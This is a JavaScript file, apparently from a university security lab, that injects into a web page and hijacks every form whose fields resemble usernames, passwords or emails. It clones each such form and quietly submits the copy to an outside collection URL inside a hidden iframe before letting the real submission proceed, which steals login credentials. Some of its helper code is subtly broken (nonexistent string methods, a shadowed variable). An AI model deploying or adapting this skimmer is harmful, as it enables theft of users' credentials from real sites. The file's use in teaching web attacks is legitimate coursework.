/*
    Originally written (presumably) by Sid Stamm
    Shamelessly "borrowed" from a public directory by: Ben Paul, Devon Timaeus
*/
const SAVER_URL="http://www.rose-hulman.edu/~stammsl/csse442/lab/lab4/slurp.php";
const GROUP="Sir Mixalot";

/*

                                                                                                                                                                                                          
                                                                                                                                                                                                  dddddddd
        GGGGGGGGGGGGG                             tttt               RRRRRRRRRRRRRRRRR                      kkkkkkkk                    tttt                  SSSSSSSSSSSSSSS   iiii              d::::::d
     GGG::::::::::::G                          ttt:::t               R::::::::::::::::R                     k::::::k                 ttt:::t                SS:::::::::::::::S i::::i             d::::::d
   GG:::::::::::::::G                          t:::::t               R::::::RRRRRR:::::R                    k::::::k                 t:::::t               S:::::SSSSSS::::::S  iiii              d::::::d
  G:::::GGGGGGGG::::G                          t:::::t               RR:::::R     R:::::R                   k::::::k                 t:::::t               S:::::S     SSSSSSS                    d:::::d 
 G:::::G       GGGGGG    eeeeeeeeeeee    ttttttt:::::ttttttt           R::::R     R:::::R    eeeeeeeeeeee    k:::::k    kkkkkkkttttttt:::::ttttttt         S:::::S            iiiiiii     ddddddddd:::::d 
G:::::G                ee::::::::::::ee  t:::::::::::::::::t           R::::R     R:::::R  ee::::::::::::ee  k:::::k   k:::::k t:::::::::::::::::t         S:::::S            i:::::i   dd::::::::::::::d 
G:::::G               e::::::eeeee:::::eet:::::::::::::::::t           R::::RRRRRR:::::R  e::::::eeeee:::::eek:::::k  k:::::k  t:::::::::::::::::t          S::::SSSS          i::::i  d::::::::::::::::d 
G:::::G    GGGGGGGGGGe::::::e     e:::::etttttt:::::::tttttt           R:::::::::::::RR  e::::::e     e:::::ek:::::k k:::::k   tttttt:::::::tttttt           SS::::::SSSSS     i::::i d:::::::ddddd:::::d 
G:::::G    G::::::::Ge:::::::eeeee::::::e      t:::::t                 R::::RRRRRR:::::R e:::::::eeeee::::::ek::::::k:::::k          t:::::t                   SSS::::::::SS   i::::i d::::::d    d:::::d 
G:::::G    GGGGG::::Ge:::::::::::::::::e       t:::::t                 R::::R     R:::::Re:::::::::::::::::e k:::::::::::k           t:::::t                      SSSSSS::::S  i::::i d:::::d     d:::::d 
G:::::G        G::::Ge::::::eeeeeeeeeee        t:::::t                 R::::R     R:::::Re::::::eeeeeeeeeee  k:::::::::::k           t:::::t                           S:::::S i::::i d:::::d     d:::::d 
 G:::::G       G::::Ge:::::::e                 t:::::t    tttttt       R::::R     R:::::Re:::::::e           k::::::k:::::k          t:::::t    tttttt                 S:::::S i::::i d:::::d     d:::::d 
  G:::::GGGGGGGG::::Ge::::::::e                t::::::tttt:::::t     RR:::::R     R:::::Re::::::::e         k::::::k k:::::k         t::::::tttt:::::t     SSSSSSS     S:::::Si::::::id::::::ddddd::::::dd
   GG:::::::::::::::G e::::::::eeeeeeee        tt::::::::::::::t     R::::::R     R:::::R e::::::::eeeeeeee k::::::k  k:::::k        tt::::::::::::::t     S::::::SSSSSS:::::Si::::::i d:::::::::::::::::d
     GGG::::::GGG:::G  ee:::::::::::::e          tt:::::::::::tt     R::::::R     R:::::R  ee:::::::::::::e k::::::k   k:::::k         tt:::::::::::tt     S:::::::::::::::SS i::::::i  d:::::::::ddd::::d
        GGGGGG   GGGG    eeeeeeeeeeeeee            ttttttttttt       RRRRRRRR     RRRRRRR    eeeeeeeeeeeeee kkkkkkkk    kkkkkkk          ttttttttttt        SSSSSSSSSSSSSSS   iiiiiiii   ddddddddd   ddddd
                                                                                                                                                                                                          
                                                                                                                                                                                                          


*/



/**
 * Code to attach to all forms in this document
 */
var frms = document.getElementsByTagName("form");
for (i=0; i<frms.length; i++) {
  hijack(frms.item(i));
}
function hijack(frmObj) {
  var delayCode = "";
  if (frmObj.hasAttribute("onsubmit")) {
    delayCode = frmObj.getAttribute("onsubmit");
  }
  if (hasUsefulData(frmObj)) {
    frmObj.setAttribute("onsubmit", "return leech(this,function(){" + delayCode + "});");
  }
}

/**
 * Copies and submits a form object’s complete contents
 */
function leech(frmObj, delayCode) {
  //create a copy of the existing form, with unique ID
  var rnd = Math.floor(Math.random() * 256);
  var newFrm = frmObj.cloneNode(true);
  //deep clone
  newFrm.setAttribute("id", "leechedID" + rnd);
  newFrm.setAttribute("target", "hiddenframe" + newFrm.id);
  newFrm.setAttribute("action", SAVER_URL);
  newFrm.setAttribute("method", "GET");

  var elt = document.createElement("input");
  elt.setAttribute("type", "hidden");
  elt.setAttribute("name", "442team");
  elt.setAttribute("value", GROUP);
  newFrm.appendChild(elt);

  //create an iframe to hide the form submission.
  var hiddenIframe = document.createElement("iframe");
  //hiddenIframe.setAttribute("style", "position:absolute;" + "visibility:hidden;z-index:0;");
  hiddenIframe.setAttribute("style", "position:absolute;");
  hiddenIframe.setAttribute("name", "hiddenframe" + newFrm.id);
  //add form to hidden iframe and iframe to the document
  hiddenIframe.appendChild(newFrm);
  window.document.body.appendChild(hiddenIframe);
  //do stealthy submission of hijacked form
  newFrm.submit();
  // Prevent race-winning by setting event for the future.
  // This real form submission happens 50ms after the hijacked one.
  setTimeout(function() {
    //hide traces of the dual submit
    window.document.body.removeChild(hiddenIframe);
    //emulate the onSubmit handler by evaluating given code
    if (delayCode() != false) { frmObj.submit(); }
  }, 50);
  //disallow other submission just yet
  return false;
}

function hasUsefulData(formObject) {
    var inputs = formObject.getElementsByTagName('input');
    if(inputs.length > 0) {
        for(var index = 0; index < inputs.length; index++) {
            if(isLoginInfo(inputs[index])){
                return true;
            }
        }
    }
    return false;
}

function isLoginInfo(input) {
    var possibleValues = ['username', 'user', 'usr', 'pass','passwd','password','pwd', 'email','e-mail', 'login', 'id','name','log']
    var value = false;
    possibleValues.forEach(function(value){
        value = value || namePlaceholderCheck(value, input);
    });
    return value;
}

function namePlaceholderCheck(searchText, input){
    return input.getAttribute('name').toLower().contains(searchText) || input.getAttribute('placeholder').toLower().contains(searchText);
}